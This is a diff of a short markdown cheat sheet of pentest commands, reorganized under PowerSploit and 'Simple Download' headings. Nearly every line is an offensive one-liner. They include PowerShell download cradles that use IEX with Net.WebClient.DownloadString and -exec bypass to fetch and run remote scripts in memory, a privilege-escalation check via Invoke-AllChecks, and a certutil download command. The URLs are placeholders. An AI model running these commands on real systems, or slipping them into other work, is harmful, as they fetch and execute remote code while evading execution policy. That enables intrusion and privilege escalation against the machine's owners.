@@ -1,10 +1,15 @@
-# tools
-Helpful pentest tools
+# Helpful pentest commands
 
-Simple Download:
-IEX (New-Object Net.WebClient).DownloadString(‘http://...’)
+## Powersploit
 
-In-Memory:
-powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://...’); Invoke-AllChecks”
+* powershell -exec bypass -c "Import-Module .\Privesc; Invoke-AllChecks"
 
-certutil -urlcache -split -f "http://..."
+#### Download In-Memory:
+
+* powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://<PRIVESC URL>’); Invoke-AllChecks”
+
+## Simple Download:
+
+* certutil -urlcache -split -f "http://..."
+
+* IEX (New-Object Net.WebClient).DownloadString(‘http://...’)
